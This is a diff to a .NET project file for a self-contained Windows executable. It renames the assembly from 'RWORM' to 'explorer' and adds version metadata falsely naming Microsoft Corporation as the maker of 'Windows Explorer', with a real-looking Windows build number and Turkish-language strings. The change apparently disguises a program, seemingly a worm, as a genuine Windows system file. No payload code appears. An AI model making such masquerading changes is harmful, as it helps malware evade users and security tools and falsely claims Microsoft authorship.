@@ -4,7 +4,20 @@
     <OutputType>WinExe</OutputType>
     <TargetFramework>net8.0-windows</TargetFramework>
     <RuntimeIdentifier>win-x64</RuntimeIdentifier>
-    <AssemblyName>RWORM</AssemblyName>
+        <AssemblyName>explorer</AssemblyName>
+    <AssemblyTitle>explorer</AssemblyTitle>
+    <AssemblyDescription>Windows Gezgini</AssemblyDescription>
+    <Description>Windows Explorer</Description>
+    <AssemblyCompany>Microsoft Corporation</AssemblyCompany>
+    <Company>Microsoft Corporation</Company>
+    <AssemblyProduct>Microsoft® Windows® İşletim Sistemi</AssemblyProduct>
+    <Product>Microsoft® Windows® Operating System</Product>
+    <AssemblyCopyright>© Microsoft Corporation. Tüm hakları saklıdır.</AssemblyCopyright>
+    <Copyright>© Microsoft Corporation. Tüm hakları saklıdır.</Copyright>
+    <AssemblyVersion>10.0.26100.1710</AssemblyVersion>
+    <AssemblyFileVersion>10.0.26100.1710</AssemblyFileVersion>
+    <FileVersion>10.0.26100.1710</FileVersion>
+    <Version>10.0.26100.1710</Version>
     <PublishSingleFile>true</PublishSingleFile>
     <SelfContained>true</SelfContained>
     <Nullable>enable</Nullable>
